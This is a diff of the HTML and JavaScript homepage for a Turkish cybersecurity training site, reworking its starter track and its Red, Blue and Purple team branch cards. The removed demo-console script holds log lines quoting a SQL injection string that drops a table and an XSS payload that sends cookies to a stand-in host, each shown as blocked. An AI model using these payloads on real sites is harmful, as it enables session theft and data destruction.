+                                Ezberci dokümanlar ve karmaşık sanal makine kurulumları yok. Temel ağ protokollerinden başlayarak tarayıcında ofansif ve defansif refleksler kazan.
+                            </p>
+                            <div class="lfl-hero-cta-row">
+                                <button type="button" class="btn-lfl-primary-cta" id="btn-hero-scroll-starter">
+                                    <span>🚀 Starter Patikasına Başla (18 Temel Oda)</span>
+                                </button>
+                                <button type="button" class="btn-lfl-secondary-cta" id="btn-hero-explore-terminal">
+                                    <span>⚡ Terminal &amp; Araçları Keşfet</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- ==========================================
+                             BÖLÜM 2: HIZLI BAŞLANGIÇ / SEVİYE YÖNLENDİRİCİ (3 MİNİ KART)
+                             ========================================== -->
+                        <div class="quick-level-selector-grid" data-reveal>
+                            <!-- Kart 01 -->
+                            <div class="level-selector-card card-zero" id="card-level-01" role="button" tabindex="0">
+                                <div>
+                                    <div class="level-card-top">
+                                        <span class="level-card-num num-green">01</span>
+                                        <h3 class="level-card-title">Tamamen Sıfırım</h3>
+                                    </div>
+                                    <p class="level-card-who" style="margin-top: 8px;">
+                                        "IP, Port, Terminal nedir bilmiyorum" diyenler
+                                    </p>
                                 </div>
-                                <h2 class="tree-title" data-i18n="tree_title">Sıfırdan Başla ➔ Uzmanlaşma Patikası</h2>
-                                <p class="tree-subtitle" data-i18n="tree_subtitle">Hiçbir ön bilgiye gerek yok. Kökten başla, temelleri kavra; ardından ilgi duyduğun alana (Red, Blue, Purple) doğru dallanarak uzmanlaş.</p>
+                                <div class="level-card-action">
+                                    <span>[ 01 Ağ Temelleri ]'ne kaydır &darr;</span>
+                                </div>
                             </div>
 
-                            <!-- ROOT: STARTER TRACK (KÖK KATMAN) -->
-                            <div class="tree-root-wrapper">
+                            <!-- Kart 02 -->
+                            <div class="level-selector-card card-mid" id="card-level-02" role="button" tabindex="0">
+                                <div>
+                                    <div class="level-card-top">
+                                        <span class="level-card-num">02</span>
+                                        <h3 class="level-card-title">Temelim Var</h3>
+                                    </div>
+                                    <p class="level-card-who" style="margin-top: 8px;">
+                                        "Linux komutlarını ve ağı biliyorum, araç arıyorum" diyenler
+                                    </p>
+                                </div>
+                                <div class="level-card-action">
+                                    <span>[ 09 Nmap Taraması ]'na atla &darr;</span>
+                                </div>
+                            </div>
+
+                            <!-- Kart 03 -->
+                            <div class="level-selector-card card-direct" id="card-level-03" role="button" tabindex="0">
+                                <div>
+                                    <div class="level-card-top">
+                                        <span class="level-card-num num-purple">03</span>
+                                        <h3 class="level-card-title">Doğrudan Tatbikat</h3>
+                                    </div>
+                                    <p class="level-card-who" style="margin-top: 8px;">
+                                        "Saldırı veya Savunma alanında uzmanlaşmak istiyorum" diyenler
+                                    </p>
+                                </div>
+                                <div class="level-card-action">
+                                    <span>Dallar (Red / Blue / Purple) bölümüne atla &darr;</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- ==========================================
+                             BÖLÜM 3: STARTER TRACK (18 TEMEL EĞİTİM VE GÖREV ODASI) — SAYFANIN YILDIZI
+                             ========================================== -->
+                        <div class="branching-skill-tree-container" id="branching-skill-tree" style="margin-top: 0;" data-reveal>
+                            <div class="tree-root-wrapper" id="starter-track-section">
                                 <div class="tree-root-card tilt-3d-card" data-tilt>
                                     <div class="tilt-glare"></div>
                                     <div class="tree-root-badge">
                                         <span class="root-pulse-icon">🌱</span>
-                                        <span>SEVİYE 0 // SIFIRDAN BAŞLAYANLAR İÇİN KÖK PATİKA</span>
+                                        <span data-i18n="tree_root_badge">SEVİYE 0 // SIFIRDAN BAŞLAYANLAR İÇİN KÖK PATİKA</span>
                                     </div>
-                                    <h3 class="tree-root-title">Starter Track // 18 Temel Eğitim ve Görev Odası</h3>
-                                    <p class="tree-root-desc">
+                                    <h2 class="tree-root-title" data-i18n="tree_root_title">Starter Track // 18 Temel Eğitim ve Görev Odası</h2>
+                                    <p class="tree-root-desc" data-i18n="tree_root_desc">
                                         Ağ mimarisi, IP/MAC, Portlar, DNS, TCP/UDP, HTTP, Linux dosya sistemi, CLI, chmod izinleri, Nmap, Hashing, Prosesler (ps/kill), grep log analizi, ss portları, tcpdump paketleri, Cookie &amp; Session, SSH anahtarları ve UFW güvenlik duvarı. Sıfır bilgiyle gel, tam donanımla ayrıl.
                                     </p>
-                                    
+
                                     <div class="tree-root-steps-grid">
-                                        <div class="root-step-pill"><span class="step-num">01</span> Ağ Temelleri &amp; IP/MAC</div>
-                                        <div class="root-step-pill"><span class="step-num">02</span> Portlar &amp; Servisler</div>
-                                        <div class="root-step-pill"><span class="step-num">03</span> DNS &amp; İsim Çözümleme</div>
-                                        <div class="root-step-pill"><span class="step-num">04</span> TCP &amp; UDP Protokolleri</div>
-                                        <div class="root-step-pill"><span class="step-num">05</span> HTTP Başlıkları &amp; Metotlar</div>
-                                        <div class="root-step-pill"><span class="step-num">06</span> Linux Dosya Hiyerarşisi</div>
-                                        <div class="root-step-pill"><span class="step-num">07</span> Terminal &amp; CLI Temelleri</div>
-                                        <div class="root-step-pill"><span class="step-num">08</span> Linux İzinleri &amp; chmod</div>
-                                        <div class="root-step-pill"><span class="step-num">09</span> Nmap ile İlk Ağ Taraması</div>
-                                        <div class="root-step-pill"><span class="step-num">10</span> Kriptografi &amp; Hashleme</div>
-                                        <div class="root-step-pill"><span class="step-num">11</span> Linux Prosesleri &amp; ps/kill</div>
-                                        <div class="root-step-pill"><span class="step-num">12</span> Log Analizi &amp; grep/Pipe</div>
-                                        <div class="root-step-pill"><span class="step-num">13</span> Dinleyen Portlar &amp; ss/netstat</div>
-                                        <div class="root-step-pill"><span class="step-num">14</span> Paket Yakalama &amp; tcpdump</div>
-                                        <div class="root-step-pill"><span class="step-num">15</span> Cookie, Session &amp; curl</div>
-                                        <div class="root-step-pill"><span class="step-num">16</span> SSH &amp; Anahtar Çiftleri</div>
-                                        <div class="root-step-pill"><span class="step-num">17</span> Güvenlik Duvarı &amp; UFW</div>
-                                        <div class="root-step-pill"><span class="step-num">18</span> Etik Hackleme &amp; Mezuniyet</div>
+                                        <a href="academy.html?track=starter&room=starter-01" class="root-step-pill" id="step-starter-01"><span class="step-num">01</span> Ağ Temelleri &amp; IP/MAC</a>
+                                        <a href="academy.html?track=starter&room=starter-02" class="root-step-pill" id="step-starter-02"><span class="step-num">02</span> Portlar &amp; Servisler</a>
+                                        <a href="academy.html?track=starter&room=starter-03" class="root-step-pill" id="step-starter-03"><span class="step-num">03</span> DNS &amp; İsim Çözümleme</a>
+                                        <a href="academy.html?track=starter&room=starter-04" class="root-step-pill" id="step-starter-04"><span class="step-num">04</span> TCP &amp; UDP Protokolleri</a>
+                                        <a href="academy.html?track=starter&room=starter-05" class="root-step-pill" id="step-starter-05"><span class="step-num">05</span> HTTP Başlıkları &amp; Metotlar</a>
+                                        <a href="academy.html?track=starter&room=starter-06" class="root-step-pill" id="step-starter-06"><span class="step-num">06</span> Linux Dosya Hiyerarşisi</a>
+                                        <a href="academy.html?track=starter&room=starter-07" class="root-step-pill" id="step-starter-07"><span class="step-num">07</span> Terminal &amp; CLI Temelleri</a>
+                                        <a href="academy.html?track=starter&room=starter-08" class="root-step-pill" id="step-starter-08"><span class="step-num">08</span> Linux İzinleri &amp; chmod</a>
+                                        <a href="academy.html?track=starter&room=starter-09" class="root-step-pill" id="step-starter-09"><span class="step-num">09</span> Nmap ile İlk Ağ Taraması</a>
+                                        <a href="academy.html?track=starter&room=starter-10" class="root-step-pill" id="step-starter-10"><span class="step-num">10</span> Kriptografi &amp; Hashleme</a>
+                                        <a href="academy.html?track=starter&room=starter-11" class="root-step-pill" id="step-starter-11"><span class="step-num">11</span> Linux Prosesleri &amp; ps/kill</a>
+                                        <a href="academy.html?track=starter&room=starter-12" class="root-step-pill" id="step-starter-12"><span class="step-num">12</span> Log Analizi &amp; grep/Pipe</a>
+                                        <a href="academy.html?track=starter&room=starter-13" class="root-step-pill" id="step-starter-13"><span class="step-num">13</span> Dinleyen Portlar &amp; ss/netstat</a>
+                                        <a href="academy.html?track=starter&room=starter-14" class="root-step-pill" id="step-starter-14"><span class="step-num">14</span> Paket Yakalama &amp; tcpdump</a>
+                                        <a href="academy.html?track=starter&room=starter-15" class="root-step-pill" id="step-starter-15"><span class="step-num">15</span> Cookie, Session &amp; curl</a>
+                                        <a href="academy.html?track=starter&room=starter-16" class="root-step-pill" id="step-starter-16"><span class="step-num">16</span> SSH &amp; Anahtar Çiftleri</a>
+                                        <a href="academy.html?track=starter&room=starter-17" class="root-step-pill" id="step-starter-17"><span class="step-num">17</span> Güvenlik Duvarı &amp; UFW</a>
+                                        <a href="academy.html?track=starter&room=starter-18" class="root-step-pill" id="step-starter-18"><span class="step-num">18</span> Etik Hackleme &amp; Mezuniyet</a>
                                     </div>
 
                                     <div class="tree-root-action">
                                         <a href="academy.html?track=starter&room=starter-01" class="btn-tree-start-starter">
                                             <span data-i18n="tree_starter_btn">🌱 Starter Patikasına Başla (18 Temel Oda)</span>
-                                            <span class="btn-arrow">➔</span>
+                                            <span class="btn-arrow">&rarr;</span>
                                         </a>
                                     </div>
                                 </div>
                             </div>
 
-                            <!-- TRUNK SPLIT CONNECTOR (GÖVDE VE DALLANMA ÇİZGİLERİ) -->
-                            <div class="tree-trunk-connector">
+                            <!-- ==========================================
+                                 BÖLÜM 4: UZMANLAŞMA AĞACI (YETENEK DALLARI: RED • BLUE • PURPLE)
+                                 ========================================== -->
+                            <div class="tree-trunk-connector" id="specialization-branches-section">
                                 <div class="trunk-vertical-line">
                                     <div class="trunk-pulse-node"></div>
                                 </div>
                                 <div class="trunk-split-label">
-                                    <span>⚡ KÖKÜ TAMAMLAYINCA DALINI SEÇ (UZMANLAŞMA ALANLARI) ⚡</span>
+                                    <span>&diams; KÖKÜ TAMAMLAYINCA DALINI SEÇ (UZMANLAŞMA ALANLARI) &diams;</span>
                                 </div>
                                 <div class="tree-branch-svg-container">
                                     <svg class="branch-connector-svg" viewBox="0 0 900 60" preserveAspectRatio="none">
-                                        <!-- Sol Kol (Red) -->
                                         <path d="M 450 0 C 450 30, 150 20, 150 60" class="branch-svg-line branch-red-line" />
-                                        <!-- Orta Kol (Blue) -->
                                         <path d="M 450 0 L 450 60" class="branch-svg-line branch-blue-line" />
-                                        <!-- Sağ Kol (Purple) -->
                                         <path d="M 450 0 C 450 30, 750 20, 750 60" class="branch-svg-line branch-purple-line" />
                                     </svg>
                                 </div>
                             </div>
 
-                            <!-- 3 SPECIALIZATION BRANCHES (DALLAR) -->
                             <div class="tree-branches-grid">
-                                <!-- DAL 1: RED TEAM -->
+                                <!-- KIRMIZI KART (OFANSİF OPERASYONLAR - RED TEAM) -->
                                 <div class="tree-branch-card branch-red tilt-3d-card" data-tilt>
                                     <div class="tilt-glare"></div>
                                     <div class="branch-card-header">
-                                        <span class="branch-badge red-badge">🔴 OFANSİF OPERASYONLAR</span>
+                                        <span class="branch-badge red-badge" data-i18n="tree_red_badge">🔴 OFANSİF OPERASYONLAR</span>
                                         <span class="branch-room-count">20 GÖREV ODASI</span>
                                     </div>
-                                    <h3 class="branch-card-title">Red Team (Saldırı &amp; Pentest)</h3>
+                                    <h3 class="branch-card-title" data-i18n="tree_red_title">Red Team</h3>
+                                    <div class="branch-meta-row">
+                                        <span class="branch-meta-label">HEDEF</span>
+                                        <span>Saldırı &amp; Pentest</span>
+                                    </div>
                                     <p class="branch-card-desc">
-                                        Hedef sistemlerdeki zafiyetleri istismar et, yetki yükselt, güvenlik duvarlarını ve EDR çözümlerini atlatarak tam kontrol sağla.
+                                        <strong>Kapsam:</strong> Web Sızma (SQLi, XSS), Metasploit, Linux/Win Yetki Yükseltme, Active Directory, EDR/AV Bypass.
                                     </p>
                                     <ul class="branch-topics-list">
                                         <li><span class="topic-dot red-dot"></span> Web Sızma (SQLi, XSS, CSRF, IDOR)</li>
                                         <li><span class="topic-dot red-dot"></span> Metasploit &amp; Exploit Zincirleri</li>
-                                        <li><span class="topic-dot red-dot"></span> Linux/Win Yetki Yükseltme (SUID, SeImpersonate)</li>
+                                        <li><span class="topic-dot red-dot"></span> Linux/Win Yetki Yükseltme</li>
                                         <li><span class="topic-dot red-dot"></span> Active Directory &amp; Kerberoasting</li>
                                         <li><span class="topic-dot red-dot"></span> EDR / AV Bypass &amp; Payload Gizleme</li>
-                                        <li><span class="topic-dot red-dot"></span> C2 Frameworks (Cobalt Strike, Sliver)</li>
                                     </ul>
                                     <div class="branch-card-footer">
                                         <a href="academy.html?track=red&room=red-101" class="btn-branch-action btn-red-action">
-                                            <span>🔴 Red Team Patikasına Gir</span>
-                                            <span class="btn-arrow">➔</span>
+                                            <span data-i18n="tree_red_btn">🔴 Red Team Patikasına Gir</span>
+                                            <span class="btn-arrow">&rarr;</span>
                                         </a>
                                     </div>
                                 </div>
 
-                                <!-- DAL 2: BLUE TEAM -->
+                                <!-- MAVİ KART (DEFANSİF SAVUNMA - BLUE TEAM) -->
                                 <div class="tree-branch-card branch-blue tilt-3d-card" data-tilt>
                                     <div class="tilt-glare"></div>
                                     <div class="branch-card-header">
-                                        <span class="branch-badge blue-badge">🔵 DEFANSİF SAVUNMA</span>
+                                        <span class="branch-badge blue-badge" data-i18n="tree_blue_badge">🔵 DEFANSİF SAVUNMA</span>
                                         <span class="branch-room-count">17 GÖREV ODASI</span>
                                     </div>
-                                    <h3 class="branch-card-title">Blue Team (SOC &amp; Tehdit Avı)</h3>
+                                    <h3 class="branch-card-title" data-i18n="tree_blue_title">Blue Team</h3>
+                                    <div class="branch-meta-row">
+                                        <span class="branch-meta-label">HEDEF</span>
+                                        <span>SOC &amp; Tehdit Avı</span>
+                                    </div>
                                     <p class="branch-card-desc">
-                                        Ağ trafiğini kokla, şüpheli anomalileri tespit et, adli bellek incelemesi yap ve saldırganları kurumsal ağdan püskürt.
+                                        <strong>Kapsam:</strong> Wireshark PCAP Analizi, Snort &amp; Suricata NIDS, Sysmon Avı, Volatility Bellek Adli Bilişimi, SIEM &amp; Incident Response.
                                     </p>
                                     <ul class="branch-topics-list">
-                                        <li><span class="topic-dot blue-dot"></span> Wireshark ile Paket &amp; PCAP Analizi</li>
-                                        <li><span class="topic-dot blue-dot"></span> Snort &amp; Suricata ile NIDS Kuralı</li>
-                                        <li><span class="topic-dot blue-dot"></span> Windows Event IDs &amp; Sysmon Avı</li>
-                                        <li><span class="topic-dot blue-dot"></span> Volatility ile RAM Bellek Adli Bilişimi</li>
-                                        <li><span class="topic-dot blue-dot"></span> Sigma Kuralları &amp; SIEM Entegrasyonu</li>
-                                        <li><span class="topic-dot blue-dot"></span> Incident Response (Olay Müdahale)</li>
+                                        <li><span class="topic-dot blue-dot"></span> Wireshark PCAP Analizi</li>
+                                        <li><span class="topic-dot blue-dot"></span> Snort &amp; Suricata NIDS</li>
+                                        <li><span class="topic-dot blue-dot"></span> Sysmon Avı &amp; Event ID Analizi</li>
+                                        <li><span class="topic-dot blue-dot"></span> Volatility Bellek Adli Bilişimi</li>
+                                        <li><span class="topic-dot blue-dot"></span> SIEM &amp; Incident Response</li>
                                     </ul>
                                     <div class="branch-card-footer">
                                         <a href="academy.html?track=blue&room=blue-101" class="btn-branch-action btn-blue-action">
-                                            <span>🔵 Blue Team Patikasına Gir</span>
-                                            <span class="btn-arrow">➔</span>
+                                            <span data-i18n="tree_blue_btn">🔵 Blue Team Patikasına Gir</span>
+                                            <span class="btn-arrow">&rarr;</span>
                                         </a>
                                     </div>
                                 </div>
 
-                                <!-- DAL 3: PURPLE TEAM -->
+                                <!-- MOR KART (HİBRİT OPERASYON - PURPLE TEAM) -->
                                 <div class="tree-branch-card branch-purple tilt-3d-card" data-tilt>
                                     <div class="tilt-glare"></div>
                                     <div class="branch-card-header">
                                         <span class="branch-badge purple-badge">🟣 HİBRİT OPERASYON</span>
                                         <span class="branch-room-count">14 GÖREV ODASI</span>
                                     </div>
-                                    <h3 class="branch-card-title">Purple Team (Tatbikat &amp; BAS)</h3>
+                                    <h3 class="branch-card-title">Purple Team</h3>
+                                    <div class="branch-meta-row">
+                                        <span class="branch-meta-label">HEDEF</span>
+                                        <span>Tatbikat &amp; BAS</span>
+                                    </div>
                                     <p class="branch-card-desc">
-                                        Saldırgan gibi düşün, savunmacı gibi analiz et. Savunma boşluklarını kapat, tehdit modelleri kur ve güvenlik duruşunu doğrula.
+                                        <strong>Kapsam:</strong> MITRE ATT&amp;CK Eşleme, Atomic Red Team Simülasyonu, Tehdit Modellemesi, Zero-Trust Doğrulama.
                                     </p>
                                     <ul class="branch-topics-list">
-                                        <li><span class="topic-dot purple-dot"></span> MITRE ATT&amp;CK &amp; Kill Chain Eşleme</li>
-                                        <li><span class="topic-dot purple-dot"></span> Boşluk (Gap) Analizi &amp; Tespit Validasyonu</li>
-                                        <li><span class="topic-dot purple-dot"></span> Atomic Red Team &amp; BAS Simülasyonu</li>
-                                        <li><span class="topic-dot purple-dot"></span> STRIDE Tehdit Modellemesi</li>
-                                        <li><span class="topic-dot purple-dot"></span> Zero-Trust Mimari Doğrulama</li>
-                                        <li><span class="topic-dot purple-dot"></span> Canlı Kırmızı/Mavi Tatbikat Koordinasyonu</li>
+                                        <li><span class="topic-dot purple-dot"></span> MITRE ATT&amp;CK Eşleme</li>
+                                        <li><span class="topic-dot purple-dot"></span> Atomic Red Team Simülasyonu</li>
+                                        <li><span class="topic-dot purple-dot"></span> Tehdit Modellemesi (STRIDE)</li>
+                                        <li><span class="topic-dot purple-dot"></span> Zero-Trust Doğrulama &amp; Gap Analizi</li>
                                     </ul>
                                     <div class="branch-card-footer">
                                         <a href="academy.html?track=purple&room=purple-101" class="btn-branch-action btn-purple-action">
-                                            <span>🟣 Purple Team Patikasına Gir</span>
-                                            <span class="btn-arrow">➔</span>
+                                            <span data-i18n="tree_purple_btn">🟣 Purple Team Patikasına Gir</span>
+                                            <span class="btn-arrow">&rarr;</span>
                                         </a>
                                     </div>
                                 </div>
                             </div>
 
-                            <!-- BOTTOM QUIZ CALLOUT -->
+                            <!-- ROL TESTİ YÖNLENDİRİCİ -->
                             <div class="tree-bottom-quiz-box">
                                 <div class="tree-quiz-info">
                                     <div class="tree-quiz-icon">🎯</div>
@@ -774,13 +893,58 @@
                                         <p data-i18n="tree_quiz_desc">10 gerçekçi kurumsal senaryo sorusunu yanıtla; güçlü ve zayıf yönlerini analiz edip sana özel siber güvenlik rolünü belirleyelim.</p>
                                     </div>
                                 </div>
-                                <button type="button" class="btn-tree-quiz-launch" id="btn-tree-quiz-action" onclick="(function(){ if (typeof window.navigateToPage === 'function') { window.navigateToPage('page-quiz'); } else { const qb = document.querySelector('[data-page=\'page-quiz\']'); if (qb) qb.click(); else window.location.hash = '#page-quiz'; } const main = document.querySelector('.app-main'); if (main) main.scrollTo({top: 0, behavior: 'smooth'}); })()">
+                                <button type="button" class="btn-tree-quiz-launch" id="btn-tree-quiz-action" onclick="(function(){ if (typeof window.navigateToPage === 'function') { window.navigateToPage('page-quiz'); } else { const qb = document.querySelector('[data-page=\\'page-quiz\\']'); if (qb) qb.click(); else window.location.hash = '#page-quiz'; } const main = document.querySelector('.app-main'); if (main) main.scrollTo({top: 0, behavior: 'smooth'}); })()">
                                     <span data-i18n="tree_quiz_btn">Siber Rol Testini Başlat</span>
-                                    <span class="btn-arrow">➔</span>
+                                    <span class="btn-arrow">&rarr;</span>
                                 </button>
                             </div>
                         </div>
 
+                        <!-- ==========================================
+                             BÖLÜM 5: PLATFORMUN GERÇEK TEKNİK GÜCÜ & FOOTER
+                             ========================================== -->
+                        <div class="real-power-footer-grid" data-reveal>
+                            <!-- Kart 1: İstemci Taraflı Motor -->
+                            <div class="real-power-card">
+                                <div class="real-power-title">
+                                    <span>⚡</span>
+                                    <span>İstemci Taraflı Motor</span>
+                                </div>
+                                <p class="real-power-desc">
+                                    Tüm simülasyonlar ve terminal araçları doğrudan tarayıcında JavaScript ile yorumlanır; harici sunucu bağımlılığı yoktur.
+                                </p>
+                            </div>
+
+                            <!-- Kart 2: Etkileşimli Senaryolar -->
+                            <div class="real-power-card">
+                                <div class="real-power-title">
+                                    <span>🎯</span>
+                                    <span>Etkileşimli Senaryolar</span>
+                                </div>
+                                <p class="real-power-desc">
+                                    Sadece teorik metin değil; tarayıcı üzerinde canlı komut çalıştırabileceğin senaryo odaları.
+                                </p>
+                            </div>
+
+                            <!-- Kart 3: Geliştirici İmzası (Kompakt Rozet) -->
+                            <div class="real-power-card">
+                                <div class="real-power-title">
+                                    <span>👨‍💻</span>
+                                    <span>Geliştirici İmzası</span>
+                                </div>
+                                <p class="real-power-desc">
+                                    <strong>burak_wyxz</strong> &bull; GitHub Pages üzerinde açık kaynak siber eğitim projesi.
+                                </p>
+                                <div class="dev-compact-links">
+                                    <a href="https://www.linkedin.com/in/burak-bezmen-a177833a8/" target="_blank" rel="noopener noreferrer" class="dev-mini-link">
+                                        💼 LinkedIn &nearr;
+                                    </a>
+                                    <a href="https://youtube.com/@burak_wyxz" target="_blank" rel="noopener noreferrer" class="dev-mini-link">
+                                        ▶ YouTube &nearr;
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
 
                         <!-- Fallback elements for app.js background listeners (Hidden, non-obtrusive) -->
                         <div style="display:none;" aria-hidden="true">
@@ -792,156 +956,89 @@
                         </div>
                     </div>
 
-                    <!-- Interactive Cyber Console Engine Script -->
+                    <!-- Smooth Scroll & 3D Tilt Script for Clean Homepage -->
                     <script>
                     (function () {
-                        const LFL_SCENARIOS = {
-                            sqli: [
-                                { text: "[16:32:01] [AUDIT] Ingress HTTP POST /api/v1/auth/login from 185.220.101.4", color: "#00e5ff" },
-                                { text: "[16:32:01] [PAYLOAD] Input stream: ' OR 1=1; DROP TABLE Users; --", color: "#f59e0b" },
-                                { text: "[16:32:02] [BLOCKED] EF Core LINQ Parameterized Engine engaged.", color: "#ef4444", bold: true },
-                                { text: "[16:32:02] [STATUS] Syntax token normalized to literal parameter @p0.", color: "#94a3b8" },
-                                { text: "[16:32:02] [PASS] 0 rows leaked. Attack neutralized in 1.4ms. HTTP 401 Returned.", color: "#10b981", bold: true },
-                                { text: "[16:32:02] [METRIC] WAF Rule #4091: SQLi Signature Neutralized &bull; Zero Impact.", color: "#64748b" }
-                            ],
-                            zerotrust: [
-                                { text: "[16:32:10] [AUDIT] Ingress Internal gRPC call to /microservices/billing/payouts", color: "#00e5ff" },
-                                { text: "[16:32:10] [IDENTITY] mTLS Handshake initiated (Subject: svc-reporting-worker-02)", color: "#c084fc" },
-                                { text: "[16:32:11] [BLOCKED] RBAC Scope Insufficient: Required 'finance.write', Found 'reporting.read'", color: "#ef4444", bold: true },
-                                { text: "[16:32:11] [STATUS] Zero-Trust Enforcer: Implicit network trust within VPC is FORBIDDEN.", color: "#f59e0b" },
-                                { text: "[16:32:11] [PASS] Ephemeral JWT revoked. Lateral traversal halted. SOC SIEM Alert dispatched.", color: "#10b981", bold: true },
-                                { text: "[16:32:11] [METRIC] ISO 27001 Zero-Trust Policy #A.9.4.2 Enforced &bull; Incident Closed.", color: "#64748b" }
-                            ],
-                            xss: [
-                                { text: "[16:32:20] [AUDIT] Ingress HTTP GET /search?q=<script>fetch('https://c2.net/steal?c='+document.cookie)<\\/script>", color: "#00e5ff" },
-                                { text: "[16:32:20] [BLOCKED] WAF & CSP Dynamic Script-Whitelist triggered.", color: "#ef4444", bold: true },
-                                { text: "[16:32:21] [STATUS] Content-Security-Policy: default-src 'self'; script-src 'nonce-x99f'; object-src 'none'", color: "#94a3b8" },
-                                { text: "[16:32:21] [PASS] Raw payload HTML-entity escaped (&lt;script&gt;). Browser execution denied.", color: "#10b981", bold: true },
-                                { text: "[16:32:21] [METRIC] 0 Cookies Compromised &bull; DOM XSS Reflection Neutralized in 0.9ms.", color: "#10b981" }
-                            ],
-                            bruteforce: [
-                                { text: "[16:32:30] [AUDIT] Rate-Limiter: 45 authentication attempts detected within 2.1s from 185.220.101.5", color: "#00e5ff" },
-                                { text: "[16:32:30] [BLOCKED] Threshold Exceeded (>5 req/sec). Host quarantined automatically.", color: "#ef4444", bold: true },
-                                { text: "[16:32:31] [STATUS] Sliding Window Token Bucket empty. IP added to temporary iptables drop-list.", color: "#f59e0b" },
-                                { text: "[16:32:31] [PASS] HTTP 429 Too Many Requests issued. Host banned for 3600 seconds.", color: "#10b981", bold: true },
-                                { text: "[16:32:31] [METRIC] Brute-Force Credential Stuffing Quenched &bull; Zero CPU Spike.", color: "#64748b" }
-                            ]
-                        };
-
-                        let currentScenario = 'sqli';
-                        let typeTimer = null;
-
-                        function renderScenario(key) {
-                            if (!LFL_SCENARIOS[key]) key = 'sqli';
-                            currentScenario = key;
-
-                            document.querySelectorAll('.obf-tab-btn').forEach(btn => {
-                                btn.classList.toggle('active', btn.dataset.scenario === key);
-                            });
-
-                            const screen = document.getElementById('obf-stream-body');
-                            const gutter = document.getElementById('obf-gutter');
-                            if (!screen || !gutter) return;
-
-                            if (typeTimer) clearInterval(typeTimer);
-                            screen.innerHTML = '';
-                            gutter.innerHTML = '';
-
-                            const lines = LFL_SCENARIOS[key];
-                            let lineIdx = 0;
-
-                            typeTimer = setInterval(() => {
-                                if (lineIdx >= lines.length) {
-                                    clearInterval(typeTimer);
-                                    typeTimer = null;
-                                    return;
-                                }
-
-                                const item = lines[lineIdx];
-                                const lineNum = (lineIdx + 1).toString().padStart(2, '0');
-                                gutter.innerHTML += '<div>' + lineNum + '</div>';
-
-                                const lineEl = document.createElement('div');
-                                lineEl.style.color = item.color || '#e2e8f0';
-                                if (item.bold) lineEl.style.fontWeight = '700';
-                                lineEl.style.marginBottom = '3px';
-                                lineEl.innerHTML = item.text;
-
-                                screen.appendChild(lineEl);
-                                screen.scrollTop = screen.scrollHeight;
-                                lineIdx++;
-                            }, 110);
+                        function flashElement(el) {
+                            if (!el) return;
+                            el.classList.add('step-highlight-flash');
+                            setTimeout(() => el.classList.remove('step-highlight-flash'), 2200);
                         }
 
-                        function initConsole() {
-                            document.querySelectorAll('.obf-tab-btn').forEach(btn => {
-                                btn.addEventListener('click', () => {
-                                    const scen = btn.dataset.scenario;
-                                    if (scen) renderScenario(scen);
-                                });
-                            });
-
-                            const btnReplay = document.getElementById('btn-obf-replay');
-                            if (btnReplay) {
-                                btnReplay.addEventListener('click', () => renderScenario(currentScenario));
-                            }
-
-                            const btnHeroQuiz = document.getElementById('btn-hero-role-quiz');
-                            if (btnHeroQuiz) {
-                                btnHeroQuiz.addEventListener('click', () => {
-                                    if (typeof navigateToPage === 'function') {
-                                        navigateToPage('page-quiz');
-                                    }
-                                });
-                            }
-
-                            const btnShieldTest = document.getElementById('btn-hero-test-shield');
-                            if (btnShieldTest) {
-                                btnShieldTest.addEventListener('click', () => {
-                                    const consoleEl = document.querySelector('.obf-cyber-console');
-                                    if (consoleEl) {
-                                        consoleEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                                        renderScenario('zerotrust');
-                                    }
-                                });
-                            }
-
-                            const btnReport = document.getElementById('btn-hero-inspect-report');
-                            if (btnReport) {
-                                btnReport.addEventListener('click', () => {
-                                    if (typeof navigateToPage === 'function') {
-                                        navigateToPage('page-glossary');
-                                    }
-                                });
-                            }
-
-                            renderScenario('sqli');
-                            init3DTilt();
+                        function smoothScrollTo(targetEl, blockMode) {
+                            if (!targetEl) return;
+                            targetEl.scrollIntoView({ behavior: 'smooth', block: blockMode || 'center' });
                         }
 
-                        function init3DTilt() {
+                        function initHomepageInteractions() {
+                            // Hero Button 1: Scroll to Starter Track
+                            const btnStarter = document.getElementById('btn-hero-scroll-starter');
+                            if (btnStarter) {
+                                btnStarter.addEventListener('click', () => {
+                                    const starterSec = document.getElementById('starter-track-section');
+                                    smoothScrollTo(starterSec, 'start');
+                                });
+                            }
+
+                            // Hero Button 2: Open Terminal & Tools
+                            const btnTerminal = document.getElementById('btn-hero-explore-terminal');
+                            if (btnTerminal) {
+                                btnTerminal.addEventListener('click', () => {
+                                    if (typeof window.navigateToPage === 'function') {
+                                        window.navigateToPage('page-terminal');
+                                    } else {
+                                        const navTerm = document.querySelector('[data-page="page-terminal"]');
+                                        if (navTerm) navTerm.click();
+                                    }
+                                });
+                            }
+
+                            // Quick Level Card 01 -> Scroll to [01 Ağ Temelleri]
+                            const card01 = document.getElementById('card-level-01');
+                            if (card01) {
+                                card01.addEventListener('click', () => {
+                                    const step01 = document.getElementById('step-starter-01');
+                                    smoothScrollTo(step01, 'center');
+                                    flashElement(step01);
+                                });
+                            }
+
+                            // Quick Level Card 02 -> Scroll to [09 Nmap Taraması]
+                            const card02 = document.getElementById('card-level-02');
+                            if (card02) {
+                                card02.addEventListener('click', () => {
+                                    const step09 = document.getElementById('step-starter-09');
+                                    smoothScrollTo(step09, 'center');
+                                    flashElement(step09);
+                                });
+                            }
+
+                            // Quick Level Card 03 -> Scroll to Specialization Branches (Red/Blue/Purple)
+                            const card03 = document.getElementById('card-level-03');
+                            if (card03) {
+                                card03.addEventListener('click', () => {
+                                    const branchesSec = document.getElementById('specialization-branches-section');
+                                    smoothScrollTo(branchesSec, 'start');
+                                });
+                            }
+
+                            // 3D Tilt Effect on Skill Tree Cards
                             const cards = document.querySelectorAll('.tilt-3d-card');
                             cards.forEach(card => {
                                 const glare = card.querySelector('.tilt-glare');
-
                                 card.addEventListener('mousemove', (e) => {
                                     const rect = card.getBoundingClientRect();
                                     const x = e.clientX - rect.left;
                                     const y = e.clientY - rect.top;
-
                                     const xPct = (x / rect.width) - 0.5;
                                     const yPct = (y / rect.height) - 0.5;
-
-                                    const rotateX = -yPct * 15;
-                                    const rotateY = xPct * 15;
-
-                                    card.style.transform = 'perspective(1000px) rotateX(' + rotateX.toFixed(2) + 'deg) rotateY(' + rotateY.toFixed(2) + 'deg) translateY(-4px)';
-
